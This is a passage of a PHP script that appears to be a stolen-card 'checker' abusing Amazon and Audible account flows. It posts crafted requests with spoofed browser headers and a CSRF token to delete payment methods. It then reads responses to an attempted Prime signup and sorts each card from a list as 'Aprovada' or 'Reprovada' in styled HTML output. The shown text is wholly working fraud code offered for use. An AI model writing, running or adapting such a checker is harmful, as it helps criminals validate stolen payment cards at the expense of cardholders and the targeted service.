"isSubsConfMosaicMigrationEnabled=false&destinationUrl=%2Funified%2Fpayments%2Fmfa&transactionType=Recurring&unifiedPaymentWidgetView=true&paymentPreferenceName=Audible&clientId=audible&isAlcFlow=false&isConsentRequired=false&selectedMembershipBillingPaymentConfirmButton=adbl_accountdetails_mfa_required_credit_card_freetrial_error&selectedMembershipBillingPaymentDescriptionKey=adbl_order_redrive_membership_purchasehistory_mfa_verification&membershipBillingNoBillingDescriptionKey=adbl_order_redrive_membership_no_billing_desc_key&membershipBillingPaymentDescriptionKey=adbl_order_redrive_membership_billing_payments_list_desc_key&keepDialogOpenOnSuccess=false&isMfaCase=false&paymentsListChooseTextKey=adbl_accountdetails_select_default_payment_method&confirmSelectedPaymentDescriptionKey=&confirmButtonTextKey=adbl_paymentswidget_list_confirm_button&paymentsListDescriptionKey=adbl_accountdetails_manage_payment_methods_description&paymentsListTitleKey=adbl_accountdetails_manage_payment_methods&selectedPaymentDescriptionKey=&selectedPaymentTitleKey=adbl_paymentswidget_selected_payment_title&viewAddressDescriptionKey=&viewAddressTitleKey=adbl_paymentswidget_view_address_title&addAddressDescriptionKey=&addAddressTitleKey=adbl_paymentswidget_add_address_title&showEditTelephoneField=false&viewCardCvvField=false&editBankAccountDescriptionKey=&editBankAccountTitleKey=adbl_paymentswidget_edit_bank_account_title&addBankAccountDescriptionKey=&addBankAccountTitleKey=&editPaymentDescriptionKey=&editPaymentTitleKey=&addPaymentDescriptionKey=adbl_paymentswidget_add_payment_description&addPaymentTitleKey=adbl_paymentswidget_add_payment_title&editCardDescriptionKey=&editCardTitleKey=adbl_paymentswidget_edit_card_title&defaultPaymentMethodKey=adbl_accountdetails_default_payment_method&useAsDefaultCardKey=adbl_accountdetails_use_as_default_card&geoBlockAddressErrorKey=adbl_paymentswidget_payment_geoblocked_address&geoBlockErrorMessageKey=adbl_paymentswidget_geoblock_error_message&geoBlockErrorHeaderKey=adbl_paymentswidget_geoblock_error_header&addCardDescriptionKey=adbl_paymentswidget_add_card_description&addCardTitleKey=adbl_paymentswidget_add_card_title&ajaxEndpointPrefix=&geoBlockSupportedCountries=&enableGeoBlock=false&setDefaultOnSelect=true&makeDefaultCheckboxChecked=false&showDefaultCheckbox=false&autoSelectPayment=false&showConfirmButton=false&showAddButton=true&showDeleteButtons=true&showEditButtons=true&showClosePaymentsListButton=false&isDialog=false&isVerifyCvv=false&ref=a_accountPayments_c3_0_delete&paymentId=".$payment."&billingAddressId=".$address."&paymentType=CreditCard&tail=0433&accountHolderName=fsdsdgs%20sdffdssdff&isValid=true&isDefault=true&issuerName=MasterCard&displayIssuerName=MasterCard&bankName=&csrfToken=".urlencode($csrf)."&index=0&consentState=OptedIn",
CURLOPT_HTTPHEADER     => array(
'Host: www.'.$host1111.'',
'sec-ch-ua: "Not/A)Brand";v="99", "Brave";v="115", "Chromium";v="115"',
'Content-type: application/x-www-form-urlencoded',
'adpToken: ',
'X-Requested-With: XMLHttpRequest',
'sec-ch-ua-mobile: ?0',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
'sec-ch-ua-platform: "Windows"',
'Accept: */*',
'Sec-GPC: 1',
'Accept-Language: pt-BR,pt;q=0.9',
'Origin: https://www.'.$host1111.'',
'Referer: https://www.'.$host1111.'/account/payments?ref=',
),
]);
  $r = curl_exec($ch);

if (strpos($r, '"statusStringKey":"adbl_paymentswidget_delete_payment_success"')) {
$msg     = '✅';
$err     = "Removido: $msg $err1";
break;

} else {
$msg = '❌';
$err     = "Removido: $msg $err1";
// break;
}

}

if (strpos($r, '"statusStringKey":"adbl_paymentswidget_delete_payment_success"')) {
$msg     = '✅';
$err     = "𝐑𝐞𝐦𝐨𝐯𝐢𝐝𝐨: $msg $err1";

} else {
$msg = '❌';
$err     = "𝐑𝐞𝐦𝐨𝐯𝐢𝐝𝐨: $msg $err1";
}

if (strpos($Fim, 'We’re sorry. We’re unable to complete your Prime signup at this time. Please try again later.')) {



die('<span class="badge badge-info"style="background: linear-gradient(to right, #00e9ff, #00f1f3, #00f7de, #00fcc0, #00ff9b);">#Aprovada</span> <span class="badge badge-dark">'.$lista.' '.$bin.'</span>  <span class="text-success"> Card issuer declined CVV. ('.$err.') </span> ➔𝐓𝐢𝐦𝐞: (' . (time() - $time) . 's) <span class="badge badge-info"style="background: linear-gradient(to right, #7610b5, #9900ff, #471cd6, #000dff, #220cc9);"> </span>');

}elseif (strpos($Fim, 'Sorry. We cant complete your Prime registration at this time.')) {



die('<span class="badge badge-info"style="background: linear-gradient(to right, #00e9ff, #00f1f3, #00f7de, #00fcc0, #00ff9b);">#Aprovada</span> <span class="badge badge-dark">'.$lista.' '.$bin.'</span>  <span class="text-success">Card issuer declined CVV. ('.$err.') </span> ➔𝐓𝐢𝐦𝐞: (' . (time() - $time) . 's) <span class="badge badge-info"style="background: linear-gradient(to right, #7610b5, #9900ff, #471cd6, #000dff, #220cc9);"> </span>');

}elseif (strpos($Fim, 'InvalidInput')) {



die('<span class="badge badge-info"style="background: linear-gradient(to right, #220cc9, #000dff, #5512b3, #9900ff, #7610b5);"> Reprovada </span> <span class="badge badge-dark">'.$lista.' '.$bin.'</span> <span class="text-danger"> Card Reprobado. ('.$err.') </span> ➔ Tempo de resposta⏳: (' . (time() - $time) . 's) <span class="badge badge-info"style="background: linear-gradient(to right, #7610b5, #9900ff, #471cd6, #000dff, #220cc9);"> </span>');

}elseif (strpos($Fim, 'HARDVET_VERIFICATION_FAILED')) {



die('<span class="badge badge-info"style="background: linear-gradient(to right, #220cc9, #000dff, #5512b3, #9900ff, #7610b5);"> Reprovada </span> <span class="badge badge-dark">'.$lista.' '.$bin.'</span> <span class="text-danger"> Card nonexistent.. ('.$err.') </span> ➔ Time Result⏳: (' . (time() - $time) . 's) <span class="badge badge-info"style="background: linear-gradient(to right, #7610b5, #9900ff, #471cd6, #000dff, #220cc9);"> </span>');

} else {

die('<span class="text-danger">Erros</span> ➪ <span class="text-white">'.$lista.'</span> ➪ <span class="text-danger"> Error when making a request on Amazon.. </span> ➪ 𝐓𝐢𝐦𝐞: (' . (time() - $time) . 's)<br>');

}

?>
